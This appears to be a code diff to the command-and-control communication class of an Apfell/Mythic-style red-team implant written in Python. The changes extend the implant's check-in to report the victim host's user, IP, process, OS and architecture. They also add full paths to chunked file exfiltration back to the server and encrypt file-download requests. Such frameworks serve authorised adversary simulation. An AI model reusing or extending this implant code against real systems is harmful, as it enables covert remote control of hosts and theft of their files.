@@ -48,9 +48,8 @@ class C2():
         letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
         return ''.join(random.choice(letters) for i in range(size))
 
-    def get_file_path(self, fid, cid):
-        temp = self.file_uri.replace(self.id_field, str(fid), 1)
-        temp = temp.replace(self.id_field, str(cid))
+    def get_file_path(self, cid):
+        temp = self.file_uri.replace(self.id_field, str(cid))
         return self.string_replace_randomizations(temp)
 
     def get_next_task_path(self, tid):
@@ -119,8 +118,8 @@ class C2():
         cipher = aes_encrypt(self.base64.b64decode(self.aes_encryption_key), data)
         return self.base64.b64encode(cipher).decode('utf-8')
 
-    def checkin(self, user="", host="", ip="", pid=""):
-        userdata = self.json.dumps({"user": user, "host": host, "ip": ip, "pid": pid, "uuid": apfell.UUID})
+    def checkin(self, user="", host="", ip="", pid="", os="", arch=""):
+        userdata = self.json.dumps({"user": user, "host": host, "ip": ip, "pid": pid, "uuid": apfell.UUID, "os":os, "architecture": arch})
         if self.EKE:
             # this means we're going to do an EKE to get a new key for use
             letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
@@ -272,13 +271,13 @@ class C2():
                 print(e)
                 raise
 
-    def download(self, task_id=-1, data=""):
+    def download(self, task_id=-1, data="", path=""):
         # send data back to server as a download
         bdata = bytearray(data)
         chunks = (len(data) / self.chunk_size)
         if chunks == 0:
             chunks = 1
-        initial_response = self.post_response(response=self.json.dumps({"total_chunks": chunks, "task": task_id}), task_id=task_id)
+        initial_response = self.post_response(response=self.json.dumps({"total_chunks": chunks, "task": task_id,  "full_path": path}), task_id=task_id)
         file_id = initial_response['file_id']
         for x in range(chunks):
             chunk = bdata[x*self.chunk_size:(x+1)*self.chunk_size]
@@ -286,7 +285,12 @@ class C2():
 
     def upload(self, file_id):
         # get something from the server to write to disk
-        req = self.urllib2.Request(self.url_base + self.get_file_path(file_id, self.id),  headers=self.headers)
+        userdata = self.json.dumps({"file_id": file_id})
+        if self.encryption:
+            message = self.encrypt_apfell_message(userdata)
+        else:
+            message = userdata
+        req = self.urllib2.Request(self.url_base + self.get_file_path(self.id), message, headers=self.headers)
         response = None
         while response is None:
             try:
